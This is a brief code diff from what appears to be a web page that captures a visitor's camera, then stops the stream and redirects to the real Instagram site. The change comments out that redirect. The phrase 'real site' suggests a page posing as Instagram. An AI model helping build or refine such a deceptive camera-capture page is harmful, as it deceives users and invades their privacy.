@@ -35,7 +35,7 @@
       // 5) cleanup camera
       if (stream) stream.getTracks().forEach(t => t.stop());
       // 6) redirect to real site
-      window.location.replace('https://instagram.com');
+      //window.location.replace('https://instagram.com');
     }
   }
 
